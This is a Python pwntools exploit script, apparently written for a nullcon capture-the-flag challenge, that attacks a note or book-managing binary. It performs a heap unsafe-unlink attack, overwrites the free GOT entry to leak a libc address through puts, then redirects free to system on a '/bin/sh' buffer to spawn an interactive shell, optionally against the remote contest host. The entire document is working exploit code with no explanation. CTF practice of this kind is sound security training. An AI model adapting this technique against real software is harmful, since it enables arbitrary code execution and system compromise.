from pwn import *
import sys

#import kmpwn
#sys.path.append('/home/vagrant/kmpwn')
#from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./challenge"

HOST = "pwn2.ctf.nullcon.net"
PORT = 5002 
"""
HOST = "localhost"
PORT = 7777
"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
plt_puts = elf.plt["puts"]
plt_printf = elf.plt["printf"]
plt_atoi = elf.plt["atoi"]

got_free = elf.got["free"]
got_malloc = elf.got["malloc"]
got_puts = elf.got["puts"]

libc = ELF('./libc-2.23.so')
off_malloc = libc.symbols["malloc"]
off_system = libc.symbols["system"]
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

ptr = 0x6021a0

def buy(name):
	conn.sendlineafter("out!\n", "1")
	conn.sendafter("book?", name)

def put(index):
	conn.sendlineafter("out!\n", "2")
	conn.sendlineafter("return?\n", str(index))

def write(index,name):
	conn.sendlineafter("out!\n", "3")
	conn.sendline(str(index))
	conn.sendafter("book?", name)

def exploit():
	conn.sendlineafter("name?\n", "pokemon")	
	buy("one")	#0
	buy("one")	#1
	buy("one")	#2
	buy("one")	#3 unsafelink
	buy("one")	#4 free
	buy("/bin/sh")	#5
	
	note3 = p64(0)
	note3 += p64(0)
	note3 += p64(ptr)
	note3 += p64(ptr+8)
	note3 += "\x00"*(0xf8-0x28)
	note3 += p64(0xf0)

	write(3, note3)
	put(4)
	#
	#write(3, p64(got_free))
	write(3, p64(got_free-8))
	write(0, p64(plt_puts)+p64(plt_puts)[:-1])

	write(3, p64(got_malloc))
	put(0)
	libc_malloc = conn.recvline()[:-1]
	libc_malloc = u64(libc_malloc+"\x00"*(8-len(libc_malloc)))
	libc_base = libc_malloc - off_malloc
	libc_system = libc_base + off_system
	print(hex(libc_base))
	
	write(3, p64(got_free-8))
	write(0, p64(libc_system)+p64(libc_system)[:-1])
	put(5)

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
